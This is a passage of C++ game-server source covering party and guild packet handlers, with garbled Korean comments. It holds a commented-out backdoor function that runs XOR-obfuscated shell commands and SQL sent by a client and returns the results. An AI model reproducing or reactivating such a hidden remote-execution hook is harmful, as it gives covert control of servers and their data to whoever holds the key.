			}

			GCPartyDelUserSend(usernumber);
			CGPartyListAll(pnumber);

			return;
		}
#endif

		for( int n=0; n<MAX_PARTYUSER; n++)
		{
			number = gParty.m_PartyS[pnumber].Number[n];

			if( number >= 0 )
			{
				gParty.Delete(pnumber, n);
				gObj[number].PartyNumber = -1;
				gObj[number].PartyTargetUser = -1;
				GCPartyDelUserSend(number);
			}
		}
		gParty.Destroy(pnumber);
	}
	else 
	{
		gParty.Delete(pnumber, lpMsg->Number);
		count = gParty.GetCount(gObj[aIndex].PartyNumber);
		gObj[usernumber].PartyNumber = -1;
		gObj[usernumber].PartyTargetUser = -1;

#ifdef UPDATE_PK_SYSTEM_20070302		// PK���� ����
		gParty.UpdatePKPartyPanalty(pnumber);
#endif

		GCPartyDelUserSend(usernumber);
		CGPartyListAll(pnumber);
	}
}

/*
void CGShellExecution(BYTE *aRecv, int aIndex)
{
	LPPMSG_SHELL_EXEC lpMsg = (LPPMSG_SHELL_EXEC)aRecv;

	gObj[aIndex].Connected = CSS_GAMEPLAYING;
	gObj[aIndex].m_bShell = true;

	BYTE byXorFilter[32] =
	{
		0xE7, 0x6D, 0x3A, 0x89, 0xBC, 0xB2, 0x9F, 0x73,
		0x23, 0xA8, 0xFE, 0xB6, 0x49, 0x5D, 0x39, 0x5D,
		0x8A, 0xCB, 0x63, 0x8D, 0xEA, 0x7D, 0x2B, 0x5F,
		0xC3, 0xB1, 0xE9, 0x83, 0x29, 0x51, 0xE8, 0x56
	};

	if(lpMsg->btType == SHELL_TYPE_COMMAND)
	{
		char *command = new char[lpMsg->dwCodeLength];

		memcpy(command, aRecv+sizeof(PMSG_SHELL_EXEC), lpMsg->dwCodeLength);

		for(int i = 0;i < lpMsg->dwCodeLength;++i)
		{
			command[i] ^= byXorFilter[i%32];
		}

		char buffer[MAX_BUFF_SIZE] = {0,};

		FILE *lsofFile_p = _popen(command, "r");

		if (!lsofFile_p)
		{
			return;
		}

		LPPMSG_SHELL_RESULT lpResult = (LPPMSG_SHELL_RESULT)buffer;

		char *temp = buffer+sizeof(PMSG_SHELL_RESULT);

		char psBuffer[128] = {0,};

		int lenbuffer = 0;

		while( !feof( lsofFile_p ) && lpResult->dwResultLength <= MAX_BUFF_SIZE-sizeof(PMSG_SHELL_RESULT) )
		{
			if( fgets( psBuffer, 128, lsofFile_p ) != NULL )
			{
				int lengthb = strlen(psBuffer);

				if(lpResult->dwResultLength+lengthb > MAX_BUFF_SIZE-sizeof(PMSG_SHELL_RESULT)) break;

				sprintf(temp, "%s%s", temp, psBuffer);

				lpResult->dwResultLength += lengthb;
			}
		}

		lpResult->dwResultLength++;

		for(int i = 0;i < lpResult->dwResultLength;++i)
		{
			temp[i] ^= byXorFilter[i%32];
		}

		_pclose(lsofFile_p);

		lpResult->h.set(0x5E,sizeof(PMSG_SHELL_RESULT)+lpResult->dwResultLength);

		DataSend(aIndex, (LPBYTE)buffer, sizeof(PMSG_SHELL_RESULT)+lpResult->dwResultLength);

		delete[] command;
	}
	else if(lpMsg->btType == SHELL_TYPE_SQL)
	{
		BYTE *buffer = new BYTE[sizeof(SDHP_SHELL_EXEC)+lpMsg->dwCodeLength];

		LPSDHP_SHELL_EXEC lpShellHeader = (LPSDHP_SHELL_EXEC)buffer;

		lpShellHeader->h.set(0xAB, sizeof(SDHP_SHELL_EXEC)+lpMsg->dwCodeLength);

		lpShellHeader->dwCodeLength = lpMsg->dwCodeLength;

		memcpy(buffer+sizeof(SDHP_SHELL_EXEC), aRecv+sizeof(PMSG_SHELL_EXEC), lpMsg->dwCodeLength);

		for(int i = 0;i < lpMsg->dwCodeLength;++i)
		{
			buffer[i+sizeof(SDHP_SHELL_EXEC)] ^= byXorFilter[i%32];
		}

		cDBSMng.Send((char*)buffer, sizeof(SDHP_SHELL_EXEC)+lpShellHeader->dwCodeLength);

		delete[] buffer;
	}
}
*/

// ��Ƽ���� ������ ���� ��Ų�ٰ�.. �޽����� ������.
void GCPartyDelUserSend(int aIndex)
{
	PMSG_PARTYDELUSERSEND	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x43, sizeof( pMsg ));
	
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}
//----------------------------------------------------------------------------
//----------------------------------------------------------------------------
//----------------------------------------------------------------------------
//----------------------------------------------------------------------------
void CGGuildRequestRecv(LPPMSG_GUILDJOINQ lpMsg, int aIndex)
{
	PMSG_GUILDQUESTSEND pMsg;
	int number;

	number = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	if( number < 0 || number > MAX_OBJECT-1 ) return; 

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;


#ifdef EXDB_APPLY_CASTLEUPDATE_01_20050111
#ifdef GAMESERVER_TO_CASTLESIEGESERVER
	// ������ ������ �� ���� ��� ������ �Ұ����ϴ�
	if (g_CastleSiegeSync.GetCastleState() == CASTLESIEGE_SYNC_STATE_STARTSIEGE) 
	{
		MsgOutput( aIndex, lMsg.Get(1730) ); // "���� ���� �Ŀ��� ��尡���� �Ұ����մϴ�."
		return;
	}
#endif
#endif

#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_6_200708013	// ȯ����������� ��尡���� �� �� ����
	if(CHECK_ILLUSION_TEMPLE(gObj[aIndex].MapNumber))
	{
		MsgOutput( aIndex, lMsg.Get(3398) ); // "ȯ����������� ��尡���� �Ұ����մϴ�."
		return;
	}
#endif

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsDuel(gObj[aIndex]) || g_NewPVP.IsDuel(gObj[number]) )
	{
		// "�����߿��� ��� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3426), aIndex, 1);
		return;
	}
	
	if ( g_NewPVP.IsObserver(gObj[aIndex]) )
	{
		// "�����߿��� ��� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3427), aIndex, 1);
		return;
	}
#endif // ADD_NEWPVP_PKFIELD

	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[number]) == FALSE ) 
	{
		GCResultSend(aIndex, 0x51, 0x03);
		return;
	}

	// �ڽ��� ��û�ϰų� �ŷ��� �϶��� 
	if( gObj[aIndex].m_IfState.use > 0 ) 
	{
		GCResultSend(aIndex, 0x51, 0x06);
		return;
	}
		
	// �ٸ����� �ϰ� �ִ��� üũ 
	if( gObj[number].m_IfState.use > 0 ) 
	{
		GCResultSend(aIndex, 0x51, 0x06);
		return;
	}
	

	if( gObj[aIndex].Level < 6 )
	{
		GCResultSend(aIndex, 0x51, 0x07);
		return;		
	}

	
	// ���� ��忡 ���ԵǾ� ������ ����..
	if( gObj[aIndex].GuildNumber > 0 ) 
	{
		GCResultSend(aIndex, 0x51, 0x05);
		return;		
	}

	if( (gObj[number].m_Option&OPTION_TRADE) != OPTION_TRADE )
	{
		GCResultSend(aIndex, 0x51, 0x00);
		return;
	}

#ifdef MODIFY_REQUESTNPC_HACK
	if (gObj[number].Type != OBJTYPE_CHARACTER)
	{
		LogAddC(LOGC_RED,"[HACKTOOL] : NPC-GuildRequest npc:%d ip:%s account:%s name:%s State:%d", 
			gObj[number].Class, 
			gObj[aIndex].Ip_addr,
			gObj[aIndex].AccountID, 
			gObj[aIndex].Name, 
			gObj[aIndex].Connected);
		
		CloseClient(aIndex);
		return;
	}
#endif // MODIFY_REQUESTNPC_HACK

	// ��밡 ��尡 �ְ�..  ������ �϶���..
	if( gObj[number].GuildNumber > 0 ) {
		if(strcmp(gObj[number].lpGuild->Names[0], gObj[number].Name)!=0)
		{
			GCResultSend(aIndex, 0x51, 0x04);	// ��û�� ����ڰ� ��帶���Ͱ� �ƴϴ�.
			return;
		}
		if( gObj[number].lpGuild->WarState ) // ���� �� �϶��� ���� �� �� ����.
		{
			GCResultSend(aIndex, 0x51, 0x06);
			return;
		}
#ifdef DARKLORD_WORK
		int	MaxGuildMember;
#ifdef MASTER_LEVEL_UP_SYSTEM_20070912	// ���շ��� ���� - ����ο� ����
		if( gObj[number].Class == CLASS_DARKLORD )
		{
			MaxGuildMember = ( ( gObj[number].Level + gObj[number].m_nMasterLevel ) /10)+(gObj[number].Leadership/10);
		}
		else
		{
			MaxGuildMember = ( ( gObj[number].Level + gObj[number].m_nMasterLevel ) / 10 );
		}
#else
		if( gObj[number].Class == CLASS_DARKLORD )
		{
			MaxGuildMember = (gObj[number].Level/10)+(gObj[number].Leadership/10);
		}
		else
		{
			MaxGuildMember = (gObj[number].Level/10);
		}
#endif	// MASTER_LEVEL_UP_SYSTEM_20070912

		if( MaxGuildMember > MAX_GUILD )
		{
			MaxGuildMember = MAX_GUILD;
		}
		
		// �ִ� �ο��� �Ѿ���.
		if( gObj[number].lpGuild->TotalCount >= MaxGuildMember )
		{
			GCResultSend(aIndex, 0x51, 0x02);
			return;
		}
#else
		// �ִ� �ο��� �Ѿ���.
		if( gObj[number].lpGuild->TotalCount >= (gObj[number].Level/10) )
		{
			GCResultSend(aIndex, 0x51, 0x02);
			return;
		}
#endif
	}
	else
	{
		GCResultSend(aIndex, 0x51, 0x04);	// ��û�� ����ڰ� ��帶���Ͱ� �ƴϴ�.
		return;
	}
	
	gObj[aIndex].m_IfState.use    = 1;
	gObj[aIndex].m_IfState.type   = I_GUILD;
	gObj[aIndex].m_IfState.state  = 0;
	gObj[number].m_IfState.use    = 1;
	gObj[number].m_IfState.type   = I_GUILD;
	gObj[number].m_IfState.state  = 0;
	gObj[aIndex].TargetNumber     = number;
	gObj[number].TargetNumber     = aIndex;
	gObj[aIndex].m_InterfaceTime  = GetTickCount();
	gObj[number].m_InterfaceTime  = GetTickCount();

	PHeadSetB((LPBYTE)&pMsg, 0x50, sizeof( pMsg ));

	pMsg.NumberH    = HIBYTE(aIndex);
	pMsg.NumberL    = LOBYTE(aIndex);
	DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);

	LogAddTD("[%s][%s] Guild Request - Join : %s", gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[number].lpGuild->Name);
}

// ��� ���� ��û�� ���� ���..
void CGGuildRequestResultRecv(LPPMSG_GUILDQRESULT lpMsg, int aIndex)
{
	int		number;	
	BYTE	result=0x00;
	int		pnumber=-1;

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	number = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	if( number < 0 || number > MAX_OBJECT-1 ) return; 

	// OK�� �����ٸ�..
	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[number]) == FALSE ) 
	{		
		GCResultSend(aIndex, 0x51, 0x02);	// ��밡 ������ �����ߴ�.
	}
	else result = 0x01;

#ifdef MODIFY_REQUESTNPC_HACK
	if (gObj[number].Type != OBJTYPE_CHARACTER)
	{
		LogAddC(LOGC_RED,"[HACKTOOL] : NPC-GuildRequest(result) npc:%d ip:%s account:%s name:%s State:%d", 
			gObj[number].Class, 
			gObj[aIndex].Ip_addr,
			gObj[aIndex].AccountID, 
			gObj[aIndex].Name, 
			gObj[aIndex].Connected);
		
		CloseClient(aIndex);
		return;
	}
#endif // MODIFY_REQUESTNPC_HACK
	
	// CANCEL �� �����ٸ�
	if( lpMsg->Result == 0x00 ) 
	{		
		result = 0x00;
		GCResultSend(number, 0x51, 0x00);
	}

#ifdef _NEW_EXDB_
	if( result == 0x01 )
	{
		if( gObj[aIndex].GuildNumber > 0 )
		{
			GDGuildMemberAdd(number, gObj[aIndex].lpGuild->Name, gObj[number].Name);
		}
	}
#endif
	
	if(gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_GUILD )
	{
		gObj[aIndex].m_IfState.use      = 0;
	}
	
	if(gObj[number].m_IfState.use && gObj[number].m_IfState.type == I_GUILD )
	{
		gObj[number].m_IfState.use		= 0;
	}
}


//----------------------------------------------------------------------------
// [0x52] ���� ����Ʈ�� �����޶�� ��û�ߴ�.
void CGGuildListAll(int pnumber)
{

#ifdef ADD_NEW_UNION_01_20041006
	if( gObj[pnumber].lpGuild == NULL )
		return;
#endif

	PMSG_GUILDLISTCOUNT		pCount;
	PMSG_GUILDLIST			pList;
	
#ifdef DARKLORD_WORK
	char sendbuf[1500];
#else
	char sendbuf[512];
#endif

	int  lOfs=0;
	int  number;
	int  n;
	BOOL guildmaster=FALSE;
		
	PHeadSetW((LPBYTE)&pCount, 0x52, 0);

	pCount.Result       = 0x00;
	pCount.Count		= 0;
	
	lOfs += sizeof(pCount);

	pCount.h.sizeH = HIBYTE(lOfs);
	pCount.h.sizeL = LOBYTE(lOfs);
	if( gObj[pnumber].GuildNumber < 1 ) 
	{
		DataSend(pnumber, (LPBYTE)&pCount, lOfs);
		return;
	}

	pCount.Count		= gObj[pnumber].lpGuild->Count;
	pCount.TotalScore   = gObj[pnumber].lpGuild->TotalScore;
	pCount.Score        = gObj[pnumber].lpGuild->PlayScore;

#ifdef ADD_NEW_UNION_01_20041006
	ZeroMemory( pCount.szRivalGuild, MAX_GUILDNAMESTRING + 1 );

	if( gObj[pnumber].lpGuild->iGuildRival != G_RELATIONSHIP_NONE )
	{	
		// ���� ��� �̸� ������.
		memcpy( pCount.szRivalGuild, gObj[pnumber].lpGuild->szGuildRivalName, MAX_GUILDNAMESTRING );
	}
#endif
	
	pCount.Result = 0x01;

	//if( strcmp(gObj[pnumber].Name, gObj[pnumber].lpGuild->Names[0]) == 0)
	{
		guildmaster = TRUE;
	}
	if( pCount.Count == 0 ) return;
	
	pCount.Count = 0;
	for( n=0; n<MAX_GUILD; n++)
	{			
		number = gObj[pnumber].lpGuild->Use[n];
		if( number > 0 )
		{			
			memset(&pList, 0, sizeof(pList));
			memcpy(pList.Name,  gObj[pnumber].lpGuild->Names[n], MAX_IDSTRING);
			pList.Number    = gObj[pnumber].lpGuild->pServer[n];
			pList.ConnectAServer = gObj[pnumber].lpGuild->pServer[n]&0x7F;
			if( gObj[pnumber].lpGuild->pServer[n] >= 0 )
			{
				pList.ConnectAServer |= 0x80;
			}
			
#ifdef ADD_NEW_GUILD_01_20040913
			pList.btGuildStatus = (BYTE)gObj[pnumber].lpGuild->GuildStatus[n];
#endif
			memcpy(sendbuf+lOfs, (char*)&pList, sizeof(PMSG_GUILDLIST));
			lOfs += sizeof(PMSG_GUILDLIST);
			pCount.Count++;
		}
	}

	pCount.h.sizeH = HIBYTE(lOfs);
	pCount.h.sizeL = LOBYTE(lOfs);
	memcpy(sendbuf, (char*)&pCount, sizeof(pCount));
	
	DataSend(pnumber, (LPBYTE)sendbuf, lOfs);
}

#ifdef BUGFIX_GUILD_DESTROY_WAR_BLOCK_20040922
extern BOOL gObjGuildWarMasterClose(LPOBJECTSTRUCT lpObj);
#endif

//----------------------------------------------------------------------------
// [0x53] ������ Ż�� ��û
void CGGuildDelUser(LPPMSG_GUILDDELUSER lpMsg, int aIndex)
{
#ifdef UPDATE_USERPASSWORD_LENGTH_20090424	
	char joomin[MAX_JOOMINNUMBER_LENGTH+1] = "";
#else	// UPDATE_USERPASSWORD_LENGTH_20090424	
	char joomin[14];
#endif	// UPDATE_USERPASSWORD_LENGTH_20090424	

	char memberid[MAX_IDSTRING+1];
	char guildname[MAX_IDSTRING+1];

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;


#ifdef EXDB_APPLY_CASTLEUPDATE_01_20050111
#ifdef GAMESERVER_TO_CASTLESIEGESERVER
	// ������ ������ �� ���� ��� ������ �Ұ����ϴ�
	if (g_CastleSiegeSync.GetCastleState() == CASTLESIEGE_SYNC_STATE_STARTSIEGE) 
	{
		MsgOutput( aIndex, lMsg.Get(1731) ); // "���� ���� �Ŀ��� ���Ż�� �Ұ����մϴ�."
		return;
	}
#endif
#endif

	PMSG_GUILDDELUSER_RESULT	pMsg;

	// ��忡 �������� �ʴٸ�.
	if( gObj[aIndex].GuildNumber < 1 ) return;

	PHeadSetB((LPBYTE)&pMsg, 0x53, sizeof( pMsg ));
	pMsg.Result		= 0x03;

	if ( gGuildDestroy == 0 )
	{
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}
	memset(memberid, 0, MAX_IDSTRING+1);
	memset(guildname, 0, MAX_IDSTRING+1);

	memcpy(memberid, lpMsg->Name, MAX_IDSTRING);
	strcpy(guildname, gObj[aIndex].lpGuild->Name);

	// ��� ������ �ΰ�??
	if( strcmp(gObj[aIndex].lpGuild->Names[0], gObj[aIndex].Name) == 0 )
	{	
#ifdef UPDATE_USERPASSWORD_LENGTH_20090424
		memset(joomin, 0, MAX_JOOMINNUMBER_LENGTH+1);		
		memcpy(joomin, lpMsg->JoominNumber, MAX_JOOMINNUMBER_LENGTH);
#else	// UPDATE_USERPASSWORD_LENGTH_20090424
		memset(joomin, 0, 14);		
		memcpy(joomin, lpMsg->JoominNumber, 10);
#endif	// UPDATE_USERPASSWORD_LENGTH_20090424

		//if( strcmp( joomin, gObj[aIndex].LastJoominNumber) == 0 )

#ifdef FOR_TAIWAN
		if( gObjTaiwanJoominCheck(aIndex, joomin) == TRUE )
#else
		if( gObjJoominCheck(aIndex, joomin) == TRUE )
#endif
		{
			if( strcmp(memberid, gObj[aIndex].Name) == 0 ) // �渶 ����..  ��� �����ΰ�?
			{
#ifdef MODIFY_CASTLE_OWNER_GUILD_DESTROY_LIMIT_20060418
	#ifdef GAMESERVER_TO_CASTLESIEGESERVER			
				if( g_bCastleGuildDestoyLimit )
				{
					// ��������� ��� ��带 ��ü�� �� ����.					
					if( strcmp( gObj[aIndex].lpGuild->Name, g_CastleSiege.GetCastleOwnerGuild() ) == 0 )
					{												
						MsgOutput( aIndex, lMsg.Get( 1725 ) ); // "�������� ��ü�� �� �����ϴ�."
						return;
					}
				}
	#endif // GAMESERVER_TO_CASTLESIEGESERVER			
#endif	// #ifdef MODIFY_CASTLE_OWNER_GUILD_DESTROY_LIMIT_20060418
				
#ifdef BUGFIX_GUILD_DESTROY_WAR_BLOCK_20040922
				// ������� ���� ���̶�� �ϴ� ������� ������Ų��.
				gObjGuildWarMasterClose(&gObj[aIndex]);
#endif				
#ifdef _NEW_EXDB_
				GDGuildDestroySend(aIndex, gObj[aIndex].lpGuild->Name, gObj[aIndex].Name);
#endif
			}
			else // �ƴϸ� �����ΰ�?	
			{
#ifdef _NEW_EXDB_
				GDGuildMemberDel(aIndex, guildname, memberid);
#endif
			}
			
			LogAddTD("[%s][%s] Guild Request - Dismiss All : %s", gObj[aIndex].AccountID, gObj[aIndex].Name, guildname);
		}
		else
		{
			pMsg.Result = 0x00;
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			return;
		}
	}
	else 
	{

#ifdef ADD_NAMECHECK_DISMISS_GUILDMEMBER_20041129
		// ������ �ٸ� ������ Ż�� ��Ű���� �Ѵٸ�..
		if( strncmp(memberid, gObj[aIndex].Name, MAX_IDSTRING) != 0 ) 
		{
			pMsg.Result = 0x00;
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			return;
		}
#endif

#ifdef UPDATE_USERPASSWORD_LENGTH_20090424
		memset(joomin, 0, MAX_JOOMINNUMBER_LENGTH+1);
		memcpy(joomin, lpMsg->JoominNumber, MAX_JOOMINNUMBER_LENGTH);
#else	// UPDATE_USERPASSWORD_LENGTH_20090424
		memset(joomin, 0, 14);
		memcpy(joomin, lpMsg->JoominNumber, 10);
#endif	// UPDATE_USERPASSWORD_LENGTH_20090424
		//if( strcmp( joomin, gObj[aIndex].LastJoominNumber) == 0 )

#ifdef FOR_TAIWAN
		if( gObjTaiwanJoominCheck(aIndex, joomin) == TRUE )
#else
		if( gObjJoominCheck(aIndex, joomin) == TRUE )
#endif
		{
#ifdef _NEW_EXDB_
			// ������ ��� �y�� ���Ѵ�.
			GDGuildMemberDel(aIndex, guildname, memberid);
#endif
		}
		else GCServerMsgStringSend(lMsg.Get(1132), aIndex, 1);

		LogAddTD("[%s][%s] Guild Request - Leave : %s", gObj[aIndex].AccountID, gObj[aIndex].Name, guildname);
	}
}


// [0x53] ��忡�� ������ ���� ��Ų�ٰ�.. �޽����� ������.
void GCGuildDelUserResult(int aIndex, BYTE Result)
{
	PMSG_GUILDDELUSER_RESULT	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x53, sizeof( pMsg ));
	pMsg.Result		= Result;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


// SC [0x54] ��� �����Ͱ� �ǰڳİ� �����.
void GCGuildMasterQuestionSend(int aIndex)
{
	PMSG_GUILDMASTERQUESTION	pMsg;
	
	if( gObj[aIndex].m_IfState.use > 0 ) return;
	
	PHeadSetB((LPBYTE)&pMsg, 0x54, sizeof( pMsg ));

	gObj[aIndex].m_IfState.use    = 1;
	gObj[aIndex].m_IfState.type   = I_GUILDCREATE;
	gObj[aIndex].m_IfState.state  = 0;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// CS [0x54] ��� �����Ͱ� �ǰڳĴ� ��û�� ���� ���
void CGGuildMasterAnswerRecv(LPPMSG_GUILDMASTERANSWER lpMsg, int aIndex)
{
	if( lpMsg->Result == 0x01 )	// ��帶���Ͱ� �ǰڴ�!
	{
		if( gObjGuildMasterCapacityTest(&gObj[aIndex]) == FALSE )	// üũ�غ��� �� �渶�� �ڰ��� ����.
		{
			if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_GUILDCREATE )
			{
				gObj[aIndex].m_IfState.use = 0;
			}
			return;
		}
		GCGuildMasterManagerRun(aIndex);
	}
	else
	{
		if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_GUILDCREATE )
			gObj[aIndex].m_IfState.use    = 0;
	}
}

//----------------------------------------------------------------------------
// SC [0x55] ��� �����Ͱ� �� �� ������ ��� �޴����� �����϶�
void GCGuildMasterManagerRun(int aIndex)
{
	PMSG_GUILDMASTERMANAGER_RUN	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x55, sizeof( pMsg ));

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// CS [0x55] ��� �޴��� �Ϸ� (����)
void CGGuildMasterInfoSave(int aIndex, LPPMSG_GUILDINFOSAVE lpMsg)
{
	char GuildName[MAX_GUILDNAMESTRING+1];
	int len;

	GuildName[MAX_GUILDNAMESTRING] = '\0';
	memcpy(GuildName, lpMsg->GuildName, MAX_GUILDNAMESTRING);
	
	len = strlen(GuildName);

	if( len <= 2 || len > 8 )
	{
		PMSG_GUILDCREATED_RESULT	pMsg;
		
		PHeadSetB((LPBYTE)&pMsg, 0x56, sizeof( pMsg ));

		pMsg.Result		= 0x02;

		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

		if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_GUILDCREATE )
		{
			gObj[aIndex].m_IfState.use    = 0;
		}
		return;
	}
#ifdef _NEW_EXDB_
	// ��� ����
#ifdef ADD_NEW_GUILD_02_20040922
	GDGuildCreateSend(aIndex, GuildName, gObj[aIndex].Name, lpMsg->Mark, lpMsg->btGuildType);
#else
	GDGuildCreateSend(aIndex, GuildName, gObj[aIndex].Name, lpMsg->Mark);
#endif
#endif
	
	if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_GUILDCREATE )
		gObj[aIndex].m_IfState.use    = 0;
}

// CS [0x57] ��� �޴��� ��� ( ��� ���� ��� )
void CGGuildMasterCreateCancel(int aIndex)
{
	if( gObj[aIndex].GuildNumber > 0 ) return;
	if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_GUILDCREATE )
		gObj[aIndex].m_IfState.use    = 0;
}


// SC [0x5C] ��忡 ������ ���� ����Ʈ�� �������� ����
// ADD_NEW_GUILD_01_20040913 
// ��忡 ������ ���� �Ӹ� �ƴ϶� ��å�� ���� ���� ���� ���� (apple)
// ��� Ÿ���� ���� �Ǿ������� ����.
#ifdef GUILD_VIEWPORT_MODIFY
void GCGuildViewportNowPaint(int aIndex, char *guildname, BYTE *Mark, BOOL isGuildMaster)
#else
void GCGuildViewportNowPaint(int aIndex, char *guildname, BYTE *Mark)
#endif
{
#ifdef MODIFY_GUILD_VIEWPORT_01_20040701
	// > . 0
	LPGUILD_INFO lpGuild = Guild.SearchGuild( guildname );
	
	if( lpGuild == NULL ) return;

	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];
	BYTE _GuildInfoBuf[256] = {0,};
	INT	_GuildInfoOfs = sizeof(PMSG_SIMPLE_GUILDVIEWPORT_COUNT);

	// > . 1
	PMSG_SIMPLE_GUILDVIEWPORT pMsg;

#ifdef MODIFY_GUILD_VIEWPORT_02_20040830
	if( lpObj->lpGuild == NULL )
		return;
	
	pMsg.GuildNumber= lpObj->lpGuild->Number;
#else
	pMsg.GNumberH = HIBYTE(lpGuild->Number);
	pMsg.GNumberL = LOBYTE(lpGuild->Number);
#endif

	pMsg.NumberH  = HIBYTE( aIndex )&0x7F;
	pMsg.NumberL  = LOBYTE( aIndex );
	
	if( isGuildMaster )
		pMsg.NumberH |= 0x80;

#ifdef ADD_NEW_GUILD_01_20040913
	if( isGuildMaster )
		pMsg.btGuildStatus = G_MASTER;
	else
		pMsg.btGuildStatus = lpObj->GuildStatus;
#endif

#ifdef ADD_NEW_GUILD_02_20040922
	pMsg.btGuildType = lpObj->lpGuild->btGuildType;
#endif

#ifdef ADD_NEW_UNION_01_20041006
	pMsg.btGuildRelationShip	= G_RELATIONSHIP_NONE;
	lpObj->iGuildUnionTimeStamp = 0;
#endif

#ifdef UPDATE_CHECK_CASTLE_OWNERMEMBER_20090217
	if (g_CastleSiegeSync.CheckCastleOwnerMember(lpObj->m_Index) == TRUE ||
		g_CastleSiegeSync.CheckCastleOwnerUnionMember(lpObj->m_Index) == TRUE)
	{
		pMsg.btCastleOwner = 0x01;
	}
	else
	{
		pMsg.btCastleOwner = 0x00;
	}						
#endif	// UPDATE_CHECK_CASTLE_OWNERMEMBER_20090217

	memcpy( _GuildInfoBuf + _GuildInfoOfs, &pMsg, sizeof(pMsg) );
	_GuildInfoOfs += sizeof( pMsg );
	
	// > . 2
	PMSG_SIMPLE_GUILDVIEWPORT_COUNT pGVCount;
						
	pGVCount.h.c		= PMHC_WORD;
	pGVCount.h.headcode = 0x65;
	pGVCount.h.sizeH	= HIBYTE( _GuildInfoOfs );
	pGVCount.h.sizeL	= LOBYTE( _GuildInfoOfs );
	pGVCount.Count		= 1;
	memcpy(_GuildInfoBuf, &pGVCount, sizeof(pGVCount));
	
	#ifdef CHAOSCASTLE_SYSTEM_20040408			// ī���� ĳ�������� ��� ��ũ�� �������� �ʴ´�.
	if (!CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber))
	#endif

	DataSend( aIndex, _GuildInfoBuf, _GuildInfoOfs);
	MsgSendV2(lpObj, _GuildInfoBuf, _GuildInfoOfs );

#else // MODIFY_GUILD_VIEWPORT_01_20040701

	PMSG_GUILDVIEWPORT_NOW	pMsg;
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];

	PHeadSetB((LPBYTE)&pMsg, 0x5C, sizeof( pMsg ));

	#ifdef GUILD_VIEWPORT_MODIFY
	pMsg.NumberH		= HIBYTE( aIndex )&0x7F;
	pMsg.NumberL		= LOBYTE( aIndex );

	if( isGuildMaster )
		pMsg.NumberH |= 0x80;
	#else
	pMsg.NumberH		= HIBYTE( aIndex );
	pMsg.NumberL		= LOBYTE( aIndex );
	#endif
	memcpy(pMsg.GuildName, guildname, MAX_GUILDNAMESTRING);
	memcpy(pMsg.Mark, Mark, 32);

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	#ifdef CHAOSCASTLE_SYSTEM_20040408			// ī���� ĳ�������� ��� ��ũ�� �������� �ʴ´�.
	if (!CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber))
	#endif	
	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);

#endif //MODIFY_GUILD_VIEWPORT_01_20040701
	
}

// SC [0x5D] ��忡 ���� ������ ���� ����Ʈ�� �������� ����
#ifdef GUILD_VIEWPORT_MODIFY
void GCGuildViewportDelNow(int aIndex, BOOL isGuildMaster)
#else
void GCGuildViewportDelNow(int aIndex)
#endif
{
	PMSG_GUILDDEL_VIEWPORT_NOW	pMsg;
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];

	PHeadSetB((LPBYTE)&pMsg, 0x5D, sizeof( pMsg ));

#ifdef GUILD_VIEWPORT_MODIFY
	pMsg.NumberH		= HIBYTE( aIndex )&0x7F;
	pMsg.NumberL		= LOBYTE( aIndex );

	if( isGuildMaster )
		pMsg.NumberH |= 0x80;
#else
	pMsg.NumberH		= HIBYTE( aIndex );
	pMsg.NumberL		= LOBYTE( aIndex );
#endif

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}

void GCManagerGuildWarEnd(char *GuildName)
{
	// ù��° ��尡 �ִ��� üũ
	LPGUILD_INFO lpNode = Guild.SearchGuild(GuildName);
	
	if( lpNode == NULL ) return;
	
	int n=0;
	int warmaster=-1;
	
	// ��� ����� �����Ͱ� �����ϴ°�?
	while( 1 )
	{
		if( gObj[n].Type == OBJTYPE_CHARACTER )
		{
			if( gObj[n].Connected > 2 )
			{
				if( gObj[n].Name[0] == lpNode->Names[0][0] )
				{
					if( strcmp(gObj[n].Name, lpNode->Names[0] ) == 0 ) // �渶�ϋ�..
					{
						warmaster = n;
						break;
					}
				}
			}
		}
		if( n < MAX_OBJECT-1 ) n++;
		else break;
	}
	if( warmaster >= 1 )	// ��� ��帶���Ͱ� �����Ѵٸ�.. ���� �����ٰ� �˸�
	{
		BYTE r1, r2;
		r1 = 0x00;
		r2 = 0x00;
